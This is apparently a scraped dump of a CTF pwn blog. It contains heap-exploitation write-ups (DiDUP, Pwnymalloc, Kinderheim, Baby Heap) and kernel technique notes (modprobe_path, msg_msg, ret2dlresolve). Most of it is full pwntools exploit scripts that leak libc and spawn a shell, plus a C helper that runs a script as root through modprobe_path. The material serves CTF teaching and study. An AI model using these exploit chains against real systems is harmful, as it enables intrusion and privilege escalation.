alloc(b\u0026#34;A\u0026#34; * 0x16) # allocate the overlapped chunk # allocate over the list and place a ptr to the flag alloc(p64(heap_leak+0x330)) alloc(b\u0026#34;A\u0026#34; * 0x16) # fill the hole print(read(6)) # read the flag r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: srdnlen{my_heap_has_already_grown_this_large_1994ab0a77f8355a}\n","permalink":"http://leo1.cc/posts/writeups/srdnlen25-kinderheim_511/","summary":"Heap challenge with the goal of achieving arbitrary write to read the flag from the heap.","title":"Srdnlen 2025 - Kinderheim 511"},{"content":"Modbprobe path When a binary with unknown magic bytes/shebang gets executed the kernel tries to load a module to handle that binary type.\nTo load this module it uses modprobe, whose path is stored in a kernel global variable called modprobe_path, which is RW (there are actually some mitigations for this).\nModprobe is executed as root using this path.\nIf we have an arbitrary write primitive we can trick the kernel into running our own binary/script as root.\nExploitation Write in modeprobe_path the path of your binary/script (this should be \u0026lt;path\u0026gt;/x).\nThen call this function to automate the rest:\nvoid modprobe(char* path){ int size = strlen(path) + 0x20; char flag_dest[size]; char flag[size]; char trigger[size]; char modprobe_sh_script[size]; snprintf(flag_dest, size, \u0026#34;%s/flag_dest\u0026#34;, path); snprintf(modprobe_sh_script, size, \u0026#34;%s/x\u0026#34;, path); snprintf(flag, size, \u0026#34;/flag\u0026#34;); snprintf(trigger, size, \u0026#34;%s/b\u0026#34;, path); const char format[102] = {\u0026#34;touch %s;\u0026#34; \u0026#34;echo -e \u0026#39;#!/bin/sh\\ncat %s \u0026gt; %s\u0026#39; \u0026gt; %s;\u0026#34; \u0026#34;echo -e \u0026#39;\\xff\\xff\\xff\\xff\u0026#39; \u0026gt; %s;\u0026#34; \u0026#34;chmod +x %s; chmod +x %s;\u0026#34; \u0026#34;%s;\u0026#34; \u0026#34;cat %s;\u0026#34; }; char cmd[sizeof(format) + size*9]; snprintf(cmd, sizeof(cmd), format, flag_dest, flag, flag_dest, modprobe_sh_script, trigger, modprobe_sh_script, trigger, trigger, flag_dest); system(cmd); } NOTE: path must be a directory writeable by your user\nThis function executed the following commands:\nWrites our sh script \u0026lt;path\u0026gt;/x the script cats the flag inside a file (\u0026lt;path\u0026gt;/flag_dest) readable by the unprivileged user Creates a \u0026ldquo;binary\u0026rdquo; with unknown magic bytes (0xffffffff) Makes our script and the \u0026ldquo;invalid binary\u0026rdquo; executable Executes the \u0026ldquo;invalid binary\u0026rdquo;, triggering the use of modprobe_path, which is set to our sh script (\u0026lt;path\u0026gt;/x). This executes our script with root privileges, the script in turn reads the flag and writes it to a readable location (\u0026lt;path\u0026gt;/flag_dest). Print the flag from \u0026lt;path\u0026gt;/flag_dest Useful links https://sam4k.com/like-techniques-modprobe_path/ ","permalink":"http://leo1.cc/posts/docs/modprobe/","summary":"modprobe_path is a global variable that in most kernels is RW. This variable is contains a path to an executable, do you see where this is going..?","title":"Kpwn tecniques: modprobe_path"},{"content":"Struct msg_msg As I just started kernel exploitation I\u0026rsquo;ll cover the basics of this struct, but at the bottom there are other useful links for further exploitation. Maybe I\u0026rsquo;ll write a part 2 in the future.\nOverview msg_msg is a struct used by\nint msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg); and\nssize_t msgrcv(int msqid, void msgp, size_t msgsz, long msgtyp, int msgflg); These are syscalls responsible for sending and receiving messages to/from a queue identified by msqid.\nThis struct is composed as follows:\nstruct msg_msg { struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct msg_msgseg *next; void *security; /* the actual message follows immediately */ }; So there are 0x30 bytes of metdata before the actual message.\nIf message size \u0026gt; 0x1000 - 0x30 the message gets splitted into different allocations. These allocations are linked in a linked list, using the next pointer. This pointer can be abused for kheap leak and arbitrary read.\nAs sizeof(struct msg_msg) = message length + 0x30 this struct can be allocated inside an arbitrary kmalloc cache, starting from kmalloc-64, up to kmalloc-4k.\nIf message size \u0026gt; 0xfd0 (0x1000-0x30) multiple allocations are made by the kernel, but only the first one contains all of the message metadata. The other allocations will have only 8 bytes of metadata, occupied by the next pointer of the linked list.\nstruct msg_msgseg { struct msg_msgseg *next; /* the next part of the message follows immediately */ }; Exploitation This struct is very versatile, thus it can be exploited in many different ways.\nThe basic ones are:\nArbitrary Read\nLeverage an UAF or OOB write to override the m_ts and next pointer. If m_ts \u0026gt; 0xfd0 it means that the message is segmented into multiple allocations, but as we control next we decide where the next segment of message is. Now calling msgrcv will get the kernel to read m_ts bytes of message from the various segments. As we control next we gained arbitrary read on kernel memory. Kheap leak \u0026amp; Uninitialized memory access\nAllocate a msg_msg using msgsnd Free it with msgrcv We can allocate over this memory and leverage uninitialized memory access to leak kheap from the message metadata This can be abused further in specific cases, I did that to solve empdb from BackdoorCTF 2023. In that case, using msg_msg was an easy way to obtain a free chunk containing arbitrary values (the message text). From there I could allocate an array of pointers over the freed msg_msg and, leveraging uninitialized memory access, I was able to gain arbitrary write. More on that here.\nUseful links \u0026amp; further exploitation https://syst3mfailure.io/wall-of-perdition/ https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html https://hardenedvault.net/blog/2022-11-13-msg_msg-recon-mitigation-ved/ https://linux.die.net/man/2/msgsnd ","permalink":"http://leo1.cc/posts/docs/msg_msg/","summary":"msg_msg is a really powerful and elastic kernel struct that can be abused to obtain strong primitives, such as arbitrary read/write/free.","title":"Kpwn tecniques: struct msg_msg"},{"content":"Download Challenge ↓\nOverview DidUP? Sounds more like DiDUP to me.\nDISCLAIMER: for evil professors only!\nnc localhost 1337\nP.S: The real DidUP is out of scope, if you manage to pwn that please pay my school fees :)\nThe challenge file is a single C binary compiled with all protections.\nReversing the binary we can identify 4 main functionalities:\nadd_mark: allows the user to allocate a chunk (adding it to a list) and write a mark (int) and a description (string) into it remove_mark: frees the chunk containing the mark and removes it from the list change_mark: change the data inside a previosly allocated chunk save_mark: spawns a thread and makes a post request to an arbitrary endpoint, sending the mark as payload. It also removes the chunk. Solution Race condition The function save_mark seems suspicious because the call to free is made before the post request, but the pointer is removed from the list after it. This can trigger a race condition that can lead to a double free!\nAs we can choose the url for the request, the race condition can have an arbitrary window, we just need to setup an endpoint with a sleep.\n\u0026lt;?php if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { $body = file_get_contents(\u0026#39;php://input\u0026#39;); $logFile = \u0026#39;bodies.txt\u0026#39;; file_put_contents($logFile, $body . PHP_EOL, FILE_APPEND); // stores the body of the request sleep(3); // just wait (arb window) } else { echo \u0026#34;Make a POST request\u0026#34;; } ?\u0026gt; this is the simple endpoint I made. Please webbers, have mercy\nLeak heap Saving a file two times in a row allows us to leak the heap.\nThis can be done because, after the first free, the saved mark becomes the \u0026ldquo;safe-linked\u0026rdquo; chunk-\u0026gt;fd and if the chunk is the last in the linked list then chunk-\u0026gt;fd = heap\u0026gt;\u0026gt;12. We just need to guess the upper nibble of the heap, which is usually 0x5 or 0x6.\nIn short:\nadd chunk save chunk (start race) change chunk tcache-key sleep for 1 sec (ensure requests arrive in the right order) save chunk again (leak heap) sleep for 2 sec (end race) Note that we need to change the tcache-key (second qword of the chunk) before saving the chunk a second time, otherwise we get a SIGABRT.\nAnd now let\u0026rsquo;s have some fun with feng shui!\nPartial libc leak With some allocations we can get a chunk into unsortedbins and leak the lower 4 bytes of libc using save_mark.\nPlaying with tcache_perthread_struct At this point the easiest way of arbitrary writing is to tamper with the tcache_perthread_struct, as we avoid messing with safe linking, but as we don\u0026rsquo;t have a full libc leak we need to do some magic.\nThe idea is to free a chunk into unsortedbins so as to have a pointer to main_arena as the first entry in the 0x40 tcache linked list.\nTo achieve this we need to move to smallbins the unsortedbin that we used to partial-leak libc, otherwise freeing another big chunk won\u0026rsquo;t give us a pointer to libc. To do this we need to allocate a bunch of chunks.\nLibc-leak method 1: stdout as read primitive Once we have our pointer to main_arena as the first entry in 0x40 tcache we can partial override and make it an _IO_2_1_stdout_\u0026rsquo;s pointer. Now we can allocate a chunk over stdout and partial override _IO_write_base to dump some bytes and fully leak libc (note that buffering is disabled for sdtout, so the buffer pointers in the file struct point inside the struct itself).\\\nThis tecnique is well explained by nobodyisnobody on his github.\nLibc-leak method 2: abuse safe-linking Another way of leaking libc consists in partial overriding the main_arena\u0026rsquo;s pointer to make it point to a writable NULL region of libc.\nAllocating that chunk would trigger safe-linking (if the number of chunks in the 0x40 tcache is greater than 0).\nWe are now in the same situation as when we leaked the heap: we can use the save_mark functionality to leak libc\u0026gt;\u0026gt;12 and guess the upper nibble (0x7).\nSpawning a shell Once we have leaked libc there are different paths one can take:\nleak environ overriding _IO_2_1_stdout_ a second time and then build a ROP chain on the stack of the add_mark function\nAngry-FSROP on stdout\nlibc GOT override using a onegadget (not tested)\nlibc GOT override to stack pivot and ROP (basically this tecnique)\nExploit #!/usr/bin/env python3 from pwn import * import time import requests exe = ELF(\u0026#34;./build/didup_patched\u0026#34;) # patched libc = ELF(\u0026#34;./libs/libc.so.6\u0026#34;) context.binary = exe WEBHOOK = \u0026#34;http://your.webhook\u0026#34;.encode() gdbscript = \\ \u0026#34;\u0026#34;\u0026#34; set follow-fork-mode parent set resolve-heap-via-heuristic force \u0026#34;\u0026#34;\u0026#34; def conn(): if args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript) elif args.REMOTE: r = remote(\u0026#34;localhost\u0026#34;, 1337) else: r = process([exe.path]) return r r = conn() def add(idx, mark, desc): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) if type(mark) == bytes: r.sendlineafter(b\u0026#34;:\u0026#34;, mark) else: r.sendlineafter(b\u0026#34;:\u0026#34;, str(mark).encode()) if desc != b\u0026#34;\u0026#34;: r.sendafter(b\u0026#34;:\u0026#34;, desc) def remove(idx): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) def save(idx, url): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;4\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) r.sendlineafter(b\u0026#34;:\u0026#34;, url) def change(idx, mark, desc): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, str(idx).encode()) if type(mark) == bytes: r.sendlineafter(b\u0026#34;:\u0026#34;, mark) else: r.sendlineafter(b\u0026#34;:\u0026#34;, str(mark).encode()) if desc != b\u0026#34;\u0026#34;: r.sendafter(b\u0026#34;:\u0026#34;, desc) # given a pointer generate mark and description def gen_mark_desc(ptr): mark = ptr \u0026amp; 0xffffffff desc = p32((ptr \u0026amp; (0xffff\u0026lt;\u0026lt;32)) \u0026gt;\u0026gt; 32) return mark, desc # calculate safe-linked pointer def calculate_P1(P, L): L12 = L \u0026gt;\u0026gt; 12 P = P.to_bytes(8, \u0026#34;big\u0026#34;) L12 = L12.to_bytes(8, \u0026#34;big\u0026#34;) return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) def main(): if args.REMOTE: print(r.recvuntil(b\u0026#34;Result\u0026#34;)) r.sendlineafter(b\u0026#34;:\u0026#34;, input(\u0026#34;Result: \u0026#34;).encode()) # race condition to tcache-dup \u0026amp; leak heap add(0, 1, b\u0026#34;\u0026#34;) # -- start race -- save(0, WEBHOOK) # change tcache-key (use \u0026#34;-\u0026#34; to keep chunk-\u0026gt;fd untouched) change(0, b\u0026#34;-\u0026#34;, b\u0026#34;asdasdasdasdasd\u0026#34;) time.sleep(1) # ensure requests arrive in the right order save(0, WEBHOOK) # leak heap time.sleep(2) # -- end race -- # -- guess upper 4 bits of heap -- leak = int(requests.get(WEBHOOK.decode()+\u0026#34;bodies.txt\u0026#34;).text.split(\u0026#34;\\n\u0026#34;)[-2].split(\u0026#34;mark=\u0026#34;)[1]) heap = 0 if leak \u0026lt; 0: heap = (0x100000000 + leak) else: heap = leak heap = heap \u0026lt;\u0026lt; 12 # log.info(f\u0026#34;partial heap: {hex(heap)}\u0026#34;) # h_nibble = int(input(\u0026#34;Guess the upper nibble: 0x\u0026#34;).rjust(2, \u0026#34;0\u0026#34;), 16) # usually 0x55 \u0026lt;= (heap\u0026gt;\u0026gt;40) \u0026lt;= 0x65 if (heap\u0026gt;\u0026gt;40) \u0026gt; 5: h_nibble = 5 else: h_nibble = 6 heap = (h_nibble\u0026lt;\u0026lt;44) + heap log.warning(f\u0026#34;heap: {hex(heap)}\u0026#34;) # ------------------------------- # undo tcache dup add(0, 1, b\u0026#34;\u0026#34;) add(0, 1, b\u0026#34;\u0026#34;) # ====================================================== # create a big chunk and put it in unsortedbins # allocate from it a chunk # doing so we can partially leak libc without corrupting unsortedbins # then we need to consume the unsortedbin # in this way the thread can\u0026#39;t allocate from it (avoid heap mess and crash) # increase tcache count for i in range(2, 10): add(i, 1, b\u0026#34;\u0026#34;) for i in range(6, 10): remove(i) # race to tcache-dup add(4, 1, b\u0026#34;\u0026#34;) save(4, WEBHOOK) change(4, 6, b\u0026#34;asdasdasd\u0026#34;) remove(4) time.sleep(4) # allocate a chunk above tcache_perthread_struct # this will be used to enlarge the chunk under it add(4, 1, b\u0026#34;\u0026#34;) tcache_metadata = calculate_P1(heap+0x80, heap+0x6c0) mark, desc = gen_mark_desc(tcache_metadata) change(4, mark, desc) add(4, 1, b\u0026#34;\u0026#34;) # allocate a chunk and one above it to change its size payload = p32(0) + p64(0)*3 + p64(heap+0x430) add(4, 6, payload) # chunk above tcache_perthread_struct add(8, 1, b\u0026#34;\u0026#34;) # small chunk to overlap and enlarge the one under it payload = p32(0) + p64(0)*3 + p64(heap+0x410) change(4, 6, payload) # enlarge payload = p32(0) + p64(0)*2 + p64(0x441) add(9, 6, payload) # put big chunk in unsortedbins remove(8) # add chunk from the one in unsortedbins (now we have 2 chunks pointing to libc) add(0, 1, b\u0026#34;\u0026#34;) # we can save (free) one of them to leak 4 bytes of libc save(0, WEBHOOK) time.sleep(4) leak = int(requests.get(WEBHOOK.decode()+\u0026#34;bodies.txt\u0026#34;).text.split(\u0026#34;\\n\u0026#34;)[-2].split(\u0026#34;mark=\u0026#34;)[1]) partial_libc = 0 if leak \u0026lt; 0: partial_libc = (0x100000000 + leak) else: partial_libc = leak log.warning(f\u0026#34;partial libc: {hex(partial_libc)}\u0026#34;) # -- consume unsortedbin -- for _ in range(10): add(0, 1, b\u0026#34;\u0026#34;) for i in range(3): add(i, 1, b\u0026#34;\u0026#34;) # add entries to 0x40 tcache for i in range(3): remove(i) # ------------------------- # ====================================================== # create a big chunk over tcache_perthread_struct # and put it in unsorted bin # now we have a libc pointer as first entry in 0x40 tcache # then partial override that ptr to make it point to stdout # allocate a chunk precisely over 0x40 tcache entry in tcache_perthread_struct # it\u0026#39;s size will be changed by the chunk above payload = p32(0) + p64(0)*3 + p64(heap+0xa0) change(4, 6, payload) add(2, 1, b\u0026#34;\u0026#34;) # enlarge change(4, 6, p32(0)+flat(0,0,0x4f1)) # free it (to unsortedbins) # to have a libc ptr as first entry on 0x40 tcache remove(2) # calulate partial stdout from leaked libc bytes partial_stdout = (partial_libc \u0026amp; 0xfffff000) + 0x780 # partial override libc address to allocate over stdout payload = p32(0)+flat(0,0,0x4b1)+p32(partial_stdout) change(4, 6, payload) # ====================================================== add(5, 1, b\u0026#34;\u0026#34;) # chunk over stdout # partial override _IO_write_base to leak libc mark = 0xfbad1887 desc = p32(0) + p64(0)*3 + p32(partial_stdout-0x100) change(5, mark, desc) r.recv() libc.address = u64(r.recv(8)) - 0x21a6a0 log.warning(f\u0026#34;libc: {hex(libc.address)}\u0026#34;) # ====================================================== # leak environ abusing stdout as read primitive mark = 0xfbad1887 # _IO_write_base = _IO_read_end = environ # _IO_write_ptr = environ+0x100 desc = p32(0) + p64(0) + p64(libc.sym.environ) + p64(0) + p64(libc.sym.environ) + p64(libc.sym.environ+0x100) change(5, mark, desc) r.recv() stack = u64(r.recv(8)) - 0x148 log.warning(f\u0026#34;stack: {hex(stack)}\u0026#34;) # ====================================================== # change tcache metadata to allocate over retaddr of add_mark function # then write a ret2libc on the stack # change tcache_perthread_struct using previously allocated chunk payload = p32(0)+flat(0,0,0x511)+p64(stack) change(4, 6, payload) # ret2libc on the stack POP_RDI_RET = libc.address + 0x2a3e5 RET = libc.address + 0xf41c9 BINSH = libc.address + 0x1d8698 ret2libc = p32(0) + flat(POP_RDI_RET, BINSH, RET, libc.sym.system) add(0, 6, ret2libc) # ====================================================== log.success(f\u0026#34;pwned :)\u0026#34;) r.sendline(b\u0026#34;cat flag\u0026#34;) r.recv() flag = r.recvline().decode().rstrip(\u0026#34;\\n\u0026#34;) print(flag) # r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"http://leo1.cc/posts/writeups/cte24-didup/","summary":"This is an hard pwn challenge I wrote for Compete Against TeamEurope, this CTF was part of the training for ECSC2024. The vulnerability is a double-free triggerable through a race condition. No bruteforce is needed.","title":"CTE24 - DiDUP"},{"content":"BINARY OVERVIEW Pwnymalloc is a custom heap implementation library, the mechanics resemble the actual heap behaviors, but the code is really simple and short, so it must be pwnable!\nWe are also provided with a binary that implements a \u0026ldquo;customer service portal\u0026rdquo; using Pwnymalloc library.\nBINARY REVERSE ENGINEERING The binary allows a user to:\nSubmit a complaint: allocate a chunk, write into it and free it (basically throws our opinion away, thank you!) Request a refund: allocate a chunk and write into it (this chunk has a REFUND_APPROVED bit set to 0, and we cannot change it) Check refund status: prints the flag if a refund gets somehow approved (REFUND_APPROVED == 1) Our goal should be to break Pwnymalloc to somehow override the REFUND_APPROVED bit and get the flag, so let\u0026rsquo;s read the library\u0026rsquo;s source code.\nLIBRARY REVERSE ENGINEERING My first hope was to be able to find the vulnerability without having to reverse all the code, which was not so short after all. But, guess what\u0026hellip; I ended up reading and trying to understand the whole code :/\nThis took quite a bit of time, but being familiar with the glibc heap implementation it\u0026rsquo;s easy to guess what these functions are doing.\nReading through the code we can identify the 2 most important functions:\npwnymalloc(size):\nInitializes the heap if it’s the first allocation. Aligns the requested size and searches for a fitting block. If no suitable block is found, it extends the heap. Optionally splits larger blocks to minimize waste. Returns a pointer to the allocated memory. pwnyfree(ptr):\nValidates the pointer and its alignment. Marks the block as free and attempts to coalesce it with adjacent free blocks. Inserts the coalesced block back into the free list. A thing that caught my attention here was the \u0026ldquo;coalescence\u0026rdquo; feature: it sounded sketchy (and that turned out to be a really lucky guess).\nstatic chunk_ptr coalesce(chunk_ptr block) { chunk_ptr prev_block = prev_chunk(block); chunk_ptr next_block = next_chunk(block); size_t size = get_size(block); int prev_status = prev_block == NULL ? -1 : get_status(prev_block); int next_status = next_block == NULL ? -1 : get_status(next_block); if (prev_status == FREE \u0026amp;\u0026amp; next_status == FREE) { // ... } The functions starts by getting the pointers to the previous and next chunk, but how is it done?\nstatic chunk_ptr prev_chunk(chunk_ptr block) { if ((void *) block - get_prev_size(block) \u0026lt; heap_start || get_prev_size(block) == 0) { return NULL; } return (chunk_ptr) ((char *) block - get_prev_size(block)); } static size_t get_prev_size(chunk_ptr block) { btag_t *prev_footer = (btag_t *) ((char *) block - BTAG_SIZE); return prev_footer-\u0026gt;size; } Okay, so the btag is the size of a free chunk and it is located in the last WORD of it. Apparently this is used to calculate the pointer to the previous chunk during backward consolidation coalescence, but wait a moment, there is no check to confirm that the previous chunk is free!\nWe could basically allocate a chunk and write a fake btag in its last WORD, in this way if coalesce is triggered on the chunk after it prev_chunk would calcolate and return an arbitrary pointer!\nEXPLOITATION At this point the exploitation path was really clear to me:\nAllocate a chunk containing a fake chunk (it\u0026rsquo;s pointer will be calculated by prev_chunk using a fake btag). Allocate another chunk and place a forged btag in its last WORD, calculating the right offset from the fake chunk. Allocate a chunk and free it to trigger the coalesce mechanism and get the fake chunk into the \u0026ldquo;bin\u0026rdquo;. Finally allocate the fake chunk and override the REFUND_APPROVED bit and get the flag! Problems I faced Obviously the exploit didn\u0026rsquo;t work first try, the main problems I faced are the following:\nthe fake chunk must be aligned at 16 bytes, the fake chunk\u0026rsquo;s fd and bk (pointers to next and previous free chunks) must be set to 0 to avoid further pain, the fake chunk must be set to FREE so the metadata must be calculated with the following formula: size | status. Final Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;./chal\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] def conn(): if args.GDB: r = gdb.debug([exe.path], gdbscript=\u0026#34;b *pwnymalloc+210\u0026#34;) elif args.REMOTE: r = remote(\u0026#34;pwnymalloc.chal.uiuc.tf\u0026#34;, 1337, ssl=True) else: r = process([exe.path]) return r r = conn() def refund(amount, payload): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(amount).encode()) r.sendafter(b\u0026#34;:\u0026#34;, payload) def complaint(text): r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, text.encode()) def main(): progress = log.progress(\u0026#34;cooking\u0026#34;) # build fake chunk fake_chunk_metadata = flat(0, 0xa0) payload = b\u0026#34;a\u0026#34;*0x28 + fake_chunk_metadata + b\u0026#34;\\x00\u0026#34;*71 refund(12, payload) # allocate a chunk with a forged btag btag = 0xe0 payload = b\u0026#34;\\x00\u0026#34;*0x78 + p32(btag) + b\u0026#34;\\x00\u0026#34;*3 refund(12, payload) # allocate and free complaint(\u0026#34;hello\u0026#34;) # override REFUND_APPROVED bit of complaint REFUND_APPROVED = 1 payload = b\u0026#34;a\u0026#34;*0x40 + p64(0x91) + p32(REFUND_APPROVED) + p32(12) + b\u0026#34;\\x00\u0026#34;*0x2f refund(12, payload) # check status to get the flag! r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;4\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, b\u0026#34;1\u0026#34;) progress.success() r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: uiuctf{the_memory_train_went_off_the_tracks}\nPost Scriptum I realized that if the first thing you do after running the binary is submitting a complaint the program would SIGSEGV. That\u0026rsquo;s because pwnyfree always calls coalesce and in turn coalesce tries to get the previous chunk\u0026rsquo;s btag. The thing is that the complaint is the first heap allocation, there is no previous chunk, so the program tries to get the contents of the WORD right before the start of the heap (which is not in mapped memory).\nI learned a really good lesson here: always try the binary before reading the code!\n","permalink":"http://leo1.cc/posts/writeups/uiuctf24-pwnymalloc/","summary":"Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation.","title":"UIUCTF24 - Pwnymalloc"},{"content":"Overview Use a the function _dl_runtime_resolve_xsavec ( link_map , reloc_arg ) to relocate an arbitrary symbol (e.g. system) and call that function.\nStructures There are 3 struct that handle the relocation process: JMPREL, STRTAB, DYNSYM.\nJMPREL (.rela.plt) This stores a relocation table\nLOAD:04005C0 ; ELF JMPREL Relocation Table LOAD:04005C0 Elf64_Rela \u0026lt;404018h, 200000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT write LOAD:04005D8 Elf64_Rela \u0026lt;404020h, 300000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT strlen LOAD:04005F0 Elf64_Rela \u0026lt;404028h, 400000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT setbuf LOAD:0400608 Elf64_Rela \u0026lt;404030h, 500000007h, 0\u0026gt; ; R_X86_64_JUMP_SLOT read example of relocation table\nThe type of these entries is Elf64_Rela, which is defined as follows. The size of one entry is 24 bytes.\ntypedef struct { Elf64_Addr r_offset; /* 64 bit - Address */ Elf64_Xword r_info; /* 64 bit - Relocation type and symbol index */ Elf64_Sxword r_addend; /* 64 bit - Addend */ } Elf64_Rela; // 24 bytes /* How to extract and insert information held in the r_info field.*/ #define ELF64_R_SYM(i) ((i) \u0026gt;\u0026gt; 32) #define ELF64_R_TYPE(i) ((i) \u0026amp; 0xffffffff) #define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) \u0026lt;\u0026lt; 32) + (type)) ELF64_R_SYM(r_info) gives the index of the Elf64_Sym in DYNSYM for the specified symbol. ELF64_R_TYPE(r_info) must be equal to 7. DYNSYM (.dynsym) LOAD:04003D8 ; ELF Symbol Table LOAD:04003D8 Elf64_Sym \u0026lt;0\u0026gt; LOAD:04003F0 Elf64_Sym \u0026lt;offset aLibcStartMain - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; LOAD:0400408 Elf64_Sym \u0026lt;offset aWrite - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;write\u0026#34; LOAD:0400420 Elf64_Sym \u0026lt;offset aStrlen - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;strlen\u0026#34; LOAD:0400438 Elf64_Sym \u0026lt;offset aSetbuf - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;setbuf\u0026#34; LOAD:0400450 Elf64_Sym \u0026lt;offset aRead - offset unk_4004B0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; example of symbol table\nThis table holds relevant symbol information. Each entry is a Elf32_Sym structure and its size is 24 bytes.\ntypedef struct { Elf64_Word st_name; /* 32bit - Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* 16 bits - Section index */ Elf64_Addr st_value; /* 64 bits - Symbol value */ Elf64_Xword st_size; /* 64 bits - Symbol size */ } Elf64_Sym; // 24 bytes Only st_name is important for the exploit.\nSTRTAB (.dynstr) STRTAB is a simple table that stores the strings for symbols name.\n0x804822c:\t\u0026#34;\u0026#34; 0x804822d:\t\u0026#34;libc.so.6\u0026#34; 0x8048237:\t\u0026#34;_IO_stdin_used\u0026#34; 0x8048246:\t\u0026#34;read\u0026#34; 0x804824b:\t\u0026#34;alarm\u0026#34; 0x8048251:\t\u0026#34;__libc_start_main\u0026#34; 0x8048263:\t\u0026#34;__gmon_start__\u0026#34; 0x8048272:\t\u0026#34;GLIBC_2.0\u0026#34; example of STRTAB\nSummary of GDB commands Get JMPREL:\ngef➤ x/3xg (JMPREL) + (reloc_arg) * 24\nsymbol_number = r_info \u0026raquo; 32\ntype = r_info \u0026amp; 0xffffffff\nGet SYMTAB:\ngef➤ x/3xg (SYMTAB) + (symbol_number) * 24\nGet STRTAB:\ngef➤ x/s (STRTAB) + (st_name)\nRelocation summary A typical relocation goes as follows:\nCall _dl_runtime_resolve_xsavec ( link_map , reloc_arg ) where link_map is a list with all the loaded libraries and reloc_arg is the offset of the Elf64_Rela entry in JMPREL Knowing the address of the Elf36_Rela for the specified symbol get r_info Get R_SYM with `r_info \u0026raquo; 32 (ELF64_R_SYM macro) Get st_name from the Elf64_Sym entry with DYNSYM + R_SYM*24 Get the symbol with STRTAB + st_name Search for that symbol in link_map and then write its address to the correct GOT entry using r_offset from Elf64_Rela Finally call the relocated function EXPLOIT Forge Elf64_Rela so that DYNSYM + (r_info\u0026gt;\u0026gt;8)*24 points to a forged Elf64_Sym Forge Elf64_Sym so that st_name points to \u0026quot;system\u0026quot; Call _dl_runtime_resolve ( link_map , rel_offset ) ","permalink":"http://leo1.cc/posts/docs/ret2dlresolve/","summary":"Ret2dlresolve is a really powerful tecnique to use in pwn challenges (even tho it\u0026rsquo;s not frequently seen). It\u0026rsquo;s useful when we don\u0026rsquo;t have libc leaks or don\u0026rsquo;t know the libc version.","title":"Ret2dlresolve in 64bit binaries"},{"content":"BINARY OVERVIEW Baby Heap is a simple heap based 64 bit binary, when executed it gives the user 5 options:\nadd (create a chunk of a specified size and initialize it with the provided data) free (free a chunk) modify (modify the data of a chunk (max 40 bytes)) view (print the data contained in a chunk) exit (return from main) REVERSE ENGINEERING After trying every feature of the binary I opened it up in Ida (which usually gives the best decompiled code for x86_64bit binaries) and started to reverse the different functionalities of the program.\nADD From this function I understood 3 really important mechanics of the binary:\nWe can allocate max 15 chunks (the number of allocated chunks is saved in a global variable)\nEvery chunk we allocate is basically a \u0026ldquo;struct\u0026rdquo; (chunk of size 0x20) containing data size, a \u0026ldquo;is_used\u0026rdquo; flag and a pointer to a chunk containing the data itself.\n------------------------- | CHUNCK METADATA | ------------- ----------- | data_size | is_used | ------------- ----------- | data_chunck | | ------------------------- Structure of the chunk containing the \u0026ldquo;struct\u0026rdquo;\nEvery time a chunk is created the pointer to its \u0026ldquo;struct\u0026rdquo; is saved in a global array\nThe size of data can be max 199, so the bigger chunk we can allocate is 208 bytes big\nNOTE: Hereinafter I will use these words:\nstruct to talk about the \u0026ldquo;struct\u0026rdquo; explained above (chunk of size 0x20) chunk_num is the global variable containing the number of allocated chunks chunk_list is the global array containing the pointers to the structs is_used is the flag that determines if a chunk is free or allocated data_chunk is the chunk containing the data data_size is the number of bytes of data FREE This function might seem well implemented (it sets is_used to 0, frees data_chunk and removes its pointer from the relative struct and finally frees the struct itself). After a closer look I spotted the following issues:\nchunk_num is never decremented struct pointer is never removed from chunk_list (can lead to UAF) MODIFY This function holds the main vulnerability of the binary:\nread(0, data_chunk, 0x28); Basically you can write 40 bytes into the data chunk, but if the chunk is smaller than 0x28 we can overflow into the next chunk and manipulate its metadata.\nVIEW This simply prints the data of a chunk given its index in chunk_list. Note that it prints data_size bytes, so if we want to read more than our data we will need to tamper data_size field in struct.\nEXPLOITATION First steps First thing to do before even dreaming of exploiting this 